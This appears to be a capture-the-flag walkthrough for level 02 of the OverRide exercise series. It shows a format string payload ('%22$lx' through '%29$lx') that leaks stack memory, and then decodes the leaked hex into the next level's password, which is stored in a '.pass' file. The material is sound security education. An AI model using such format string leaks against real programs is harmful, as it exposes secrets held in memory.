# Walkthrough for Level 02

This program reads the password from `/home/users/level03/.pass`, stores it in a buffer, and then compares it to the
user input using `strcmp`. In the other hand, the binary is vulnerable to a format string attack. The username input is
directly passed to a `printf` function without any format specifier, allowing us to read memory addresses. 
By inputting format specifiers like `%n$lx` we can read the values at different stack positions. Printing from position
22 to 29 shows us a promising sequence of hexadecimal values.

```shell
llevel02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %22$lx %23$lx %24$lx %25$lx %26$lx %27$lx %28$lx %29$lx         
--[ Password: 
*****************************************
756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d 0 2520786c24323225 322520786c243332 does not have access!
```

The hexadecimal values can be converted to ASCII strings by decoding them from hex and reversing the result.

```shell
level02@OverRide:~$ python
Python 2.7.3 (default, Jun 22 2015, 19:33:41) 
[GCC 4.6.3] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> '756e505234376848'.decode('hex')[::-1]
'Hh74RPnu'
>>> '45414a3561733951'.decode('hex')[::-1]                
'Q9sa5JAE'
>>> '377a7143574e6758'.decode('hex')[::-1]
'XgNWCqz7'
>>> '354a35686e475873'.decode('hex')[::-1]
'sXGnh5J5'
>>> '48336750664b394d'.decode('hex')[::-1]
'M9KfPg3H'
>>> '0'.decode('hex')[::-1]
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/usr/lib/python2.7/encodings/hex_codec.py", line 42, in hex_decode
    output = binascii.a2b_hex(input)
TypeError: Odd-length string
```

The last value is `0`, which cannot be decoded. Ignoring that, we can concatenate the other decoded strings to form the
password.

```shell
level02@OverRide:~$ echo Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```